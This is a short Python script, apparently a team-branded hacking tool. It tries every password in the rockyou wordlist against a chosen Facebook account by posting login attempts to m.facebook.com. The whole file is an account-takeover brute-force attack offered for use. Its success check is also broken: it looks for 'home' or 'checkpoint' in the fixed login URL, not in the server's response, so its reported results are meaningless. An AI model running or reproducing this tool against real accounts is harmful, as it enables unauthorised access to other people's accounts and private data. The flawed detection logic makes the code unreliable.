import sys
from os import system
try:
    import requests
except ModuleNotFoundError:
    system('pip install requests')
green="\33[0;32m"
greenlight="\33[32;1m"
blue="\33[0;36m"
bluelight="\33[36;1m"
red="\33[31;1m"
white="\33[37;1m"
black="\33[30;1m"
yellow="\33[33;1m"
yellowlight="\33[1;33m"
url="https://m.facebook.com/login.php"

logo="""
\33[31;1m ______________
\33[31;1m  ║▒▒▒▒▒▒▒▒▒▒║
\33[31;1m  ║▒▒▒▒▒▒▒▒▒▒║
\33[31;1m  ║▒▒▒▒▒▒▒▒▒▒║
\33[31;1m  ║▒▒▒▒▒▒▒▒▒▒║
\33[31;1m  ║▒▒▒▒▒▒▒▒▒▒║
\33[31;1m  ║▒▒▒▒▒▒▒▒▒▒║
\33[31;1m ╔════════════╗
\33[31;1m ╚════════════╝         \33[31;1mauthor   \33[37;1m:  \33[36;1mHadsXdevPy
\33[31;1m  ║██████████╚╗         \33[31;1mversion  \33[37;1m:  \33[31;1m1.0
\33[31;1m  ║██╔══╗█╔═╗█║         \33[31;1mteam     \33[37;1m:  \33[31;1mSyborg \33[37;1mSyndicate
\33[31;1m  ║██║╬╔╝█╚╗║█║         \33[31;1mthanks to\33[37;1m:  \33[1;33mHaz3ll and Xn5
\33[31;1m  ║██╚═╝█║█╚╝█║
\33[31;1m  ╚╗█████████═╝
\33[31;1m   ╚╗║╠╩╩╩╩╩╝
\33[31;1m    ║║┈┈┈\33[33;1m█▐█████▒\33[37;1m.｡oO
\33[31;1m    ║██╠╦╦╦╗
\33[31;1m    ╚╗██████
\33[31;1m     ╚════╝
"""
system('clear')
print(logo)
user=input(bluelight+'TARGET ID '+white+':')
word=open('module/rockyou.txt', 'r')
for lines in word:
    pw=lines.strip()
    req=requests.post(url, data={'email':user, 'pass':pw, 'submit':'submit'})
    req.content
    if 'home' in url:
        print(greenlight+'success '+white+': '+pw)
    elif 'checkpoint' in url:
        print(yellowlight+'sesi/checkpoint '+white+': '+pw)
    else:
        print(red+'wrong pass '+white+': '+pw)
